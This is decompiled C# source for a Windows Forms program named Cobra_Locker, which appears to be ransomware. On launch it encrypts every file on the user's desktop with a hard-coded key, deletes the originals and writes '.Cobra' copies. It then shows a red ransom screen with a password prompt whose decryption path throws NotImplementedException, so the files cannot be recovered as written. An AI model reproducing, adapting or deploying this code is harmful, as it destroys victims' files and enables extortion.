using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using My;

[DesignerGenerated]
public class Cobra_Locker : Form
{
	private IContainer components;

	[field: AccessedThroughProperty("TextBox1")]
	internal virtual TextBox TextBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TextBox2")]
	internal virtual TextBox TextBox2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TextBox3")]
	internal virtual TextBox TextBox3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button Button1
	{
		[CompilerGenerated]
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Button1_Click;
			Button button = _Button1;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button1 = value;
			button = _Button1;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("TextBox4")]
	internal virtual TextBox TextBox4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TextBox5")]
	internal virtual TextBox TextBox5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TextBox6")]
	internal virtual TextBox TextBox6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label2")]
	internal virtual Label Label2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label3")]
	internal virtual Label Label3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("PictureBox1")]
	internal virtual PictureBox PictureBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TextBox7")]
	internal virtual TextBox TextBox7
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public Cobra_Locker()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		string[] files = Directory.GetFiles(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Desktop());
		string[] array = files;
		foreach (string text in array)
		{
			string text2 = ((ServerComputer)MyProject.Computer).get_FileSystem().ReadAllText(text);
			TextBox1.set_Text(text2);
			string text3 = TextBox1.get_Text();
			string key = "H1Z1525";
			Class2 @class = new Class2(key);
			string text4 = @class.EncryptData(text3);
			TextBox3.set_Text(text4);
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(text);
			string text5 = text + ".Cobra";
			StreamWriter streamWriter = ((ServerComputer)MyProject.Computer).get_FileSystem().OpenTextFileWriter(text5, true);
			streamWriter.WriteLine(TextBox3.get_Text());
			streamWriter.Close();
		}
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		//IL_00a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cc: Unknown result type (might be due to invalid IL or missing references)
		string text = Interaction.InputBox("Enter password: ", "", "", -1, -1);
		if (Operators.CompareString(text, "H1Z1525", false) == 0)
		{
			Class2 @class = new Class2(text);
			try
			{
				string text2 = @class.DecryptData(ciphertext());
				TextBox4.set_Text(text2);
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(TextBox6.get_Text());
				StreamWriter streamWriter = ((ServerComputer)MyProject.Computer).get_FileSystem().OpenTextFileWriter(TextBox6.get_Text(), true);
				streamWriter.WriteLine(TextBox4.get_Text());
				streamWriter.Close();
				Interaction.MsgBox((object)"Success Decrypt", (MsgBoxStyle)0, (object)null);
				return;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				Interaction.MsgBox((object)"Can't decrypt", (MsgBoxStyle)0, (object)null);
				ProjectData.ClearProjectError();
				return;
			}
		}
		Interaction.MsgBox((object)"Wrong.Hahaha.", (MsgBoxStyle)0, (object)null);
	}

	private string ciphertext()
	{
		throw new NotImplementedException();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_01a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b3: Expected O, but got Unknown
		//IL_03a5: Unknown result type (might be due to invalid IL or missing references)
		//IL_03af: Expected O, but got Unknown
		//IL_0429: Unknown result type (might be due to invalid IL or missing references)
		//IL_0433: Expected O, but got Unknown
		//IL_049f: Unknown result type (might be due to invalid IL or missing references)
		//IL_04a9: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Cobra_Locker));
		TextBox1 = new TextBox();
		TextBox2 = new TextBox();
		TextBox3 = new TextBox();
		Button1 = new Button();
		TextBox4 = new TextBox();
		TextBox5 = new TextBox();
		TextBox6 = new TextBox();
		Label1 = new Label();
		Label2 = new Label();
		Label3 = new Label();
		PictureBox1 = new PictureBox();
		TextBox7 = new TextBox();
		((ISupportInitialize)PictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		((Control)TextBox1).set_Location(new Point(-1, 11));
		((Control)TextBox1).set_Name("TextBox1");
		((Control)TextBox1).set_Size(new Size(100, 20));
		((Control)TextBox1).set_TabIndex(0);
		((Control)TextBox1).set_Visible(false);
		((Control)TextBox2).set_Location(new Point(-1, 67));
		((Control)TextBox2).set_Name("TextBox2");
		((Control)TextBox2).set_Size(new Size(100, 20));
		((Control)TextBox2).set_TabIndex(1);
		((Control)TextBox2).set_Visible(false);
		((Control)TextBox3).set_Location(new Point(-1, 125));
		((Control)TextBox3).set_Name("TextBox3");
		((Control)TextBox3).set_Size(new Size(100, 20));
		((Control)TextBox3).set_TabIndex(2);
		((Control)TextBox3).set_Visible(false);
		((Control)Button1).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)238));
		((Control)Button1).set_ForeColor(Color.Black);
		((Control)Button1).set_Location(new Point(410, 283));
		((Control)Button1).set_Name("Button1");
		((Control)Button1).set_Size(new Size(153, 40));
		((Control)Button1).set_TabIndex(3);
		((ButtonBase)Button1).set_Text("Decrypt");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
		((Control)TextBox4).set_Location(new Point(394, 12));
		((Control)TextBox4).set_Name("TextBox4");
		((Control)TextBox4).set_Size(new Size(100, 20));
		((Control)TextBox4).set_TabIndex(4);
		((Control)TextBox4).set_Visible(false);
		((Control)TextBox5).set_Location(new Point(394, 67));
		((Control)TextBox5).set_Name("TextBox5");
		((Control)TextBox5).set_Size(new Size(100, 20));
		((Control)TextBox5).set_TabIndex(5);
		((Control)TextBox5).set_Visible(false);
		((Control)TextBox6).set_Location(new Point(483, 129));
		((Control)TextBox6).set_Name("TextBox6");
		((Control)TextBox6).set_Size(new Size(100, 20));
		((Control)TextBox6).set_TabIndex(6);
		Label1.set_AutoSize(true);
		((Control)Label1).set_Location(new Point(448, 132));
		((Control)Label1).set_Name("Label1");
		((Control)Label1).set_Size(new Size(29, 13));
		((Control)Label1).set_TabIndex(7);
		Label1.set_Text("Path");
		Label2.set_AutoSize(true);
		((Control)Label2).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)238));
		((Control)Label2).set_Location(new Point(105, 9));
		((Control)Label2).set_Name("Label2");
		((Control)Label2).set_Size(new Size(276, 20));
		((Control)Label2).set_TabIndex(8);
		Label2.set_Text("Oops! Your have been encrypted!");
		Label3.set_AutoSize(true);
		((Control)Label3).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)Label3).set_Location(new Point(149, 55));
		((Control)Label3).set_Name("Label3");
		((Control)Label3).set_Size(new Size(194, 32));
		((Control)Label3).set_TabIndex(9);
		Label3.set_Text("If you want decrypt your files \r\nyou must have decryption code");
		PictureBox1.set_Image((Image)componentResourceManager.GetObject("PictureBox1.Image"));
		((Control)PictureBox1).set_Location(new Point(512, 9));
		((Control)PictureBox1).set_Name("PictureBox1");
		((Control)PictureBox1).set_Size(new Size(51, 60));
		PictureBox1.set_TabIndex(10);
		PictureBox1.set_TabStop(false);
		((Control)TextBox7).set_Location(new Point(-1, 151));
		TextBox7.set_Multiline(true);
		((Control)TextBox7).set_Name("TextBox7");
		TextBox7.set_ScrollBars((ScrollBars)3);
		((Control)TextBox7).set_Size(new Size(280, 184));
		((Control)TextBox7).set_TabIndex(11);
		TextBox7.set_Text(componentResourceManager.GetString("TextBox7.Text"));
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_AutoSizeMode((AutoSizeMode)0);
		((Form)this).set_BackColor(Color.Red);
		((Form)this).set_ClientSize(new Size(571, 321));
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)TextBox7);
		((Control)this).get_Controls().Add((Control)(object)PictureBox1);
		((Control)this).get_Controls().Add((Control)(object)Label3);
		((Control)this).get_Controls().Add((Control)(object)Label2);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)TextBox6);
		((Control)this).get_Controls().Add((Control)(object)TextBox5);
		((Control)this).get_Controls().Add((Control)(object)TextBox4);
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Control)this).get_Controls().Add((Control)(object)TextBox3);
		((Control)this).get_Controls().Add((Control)(object)TextBox2);
		((Control)this).get_Controls().Add((Control)(object)TextBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Cobra_Locker");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("Cobra_Locker");
		((ISupportInitialize)PictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
